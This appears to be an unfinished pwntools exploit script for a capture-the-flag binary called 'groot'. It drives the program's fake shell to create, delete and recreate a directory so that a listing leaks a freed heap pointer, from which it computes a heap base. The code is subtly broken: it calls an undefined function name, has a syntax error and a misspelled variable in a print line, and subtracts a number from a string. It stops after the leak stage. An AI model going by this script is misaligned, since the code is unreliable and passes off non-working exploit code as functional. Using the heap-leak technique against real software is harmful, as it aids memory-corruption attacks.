#!/usr/bin/python
from pwn import *
import os

def createFile(p, argv1):
    p.recvuntil("$")
    p.sendline("touch " + argv1)
def cd(p, argv1) :
    p.recvuntil("$")
    p.sendline("cd " + argv1)
def mkdir(p, argv1):
    p.recvuntil("$")
    p.sendline("mkdir " + argv1)
def listdir(p, argv1) :
    p.recvuntil("$")
    p.sendline("ls " + argv1)
def remove(p, argv1) :
    p.recvuntil("$")
    p.sendline("rm " + argv1)


p = process("./groot")
## Stage 1 : leak
## create /dir, /dir/aaa, /dir/bbb, /dir/ccc , delete /dir, recreate
mkdir      (p, "dir")
cd         (p, "dir")
create_file (p, "aaa")
create_file (p, "bbb")
create_file (p, "ccc")
cd         (p, "..")
remove     (p, "dir")
mkdir      (p, "dir")
listdir    (p, "dir")
leak = p.recvline()
leak = leak.split("\x1b\x5b\x30\x6d\x09")[2]
leak = u64(leak.ljust(8, "\x00"))
print "leak : 0x%x" % lea)
print "Heap base : " + hex(leak) - 0x12d20

mkdir      (p, "groot2")
cd         (p, "groot2")





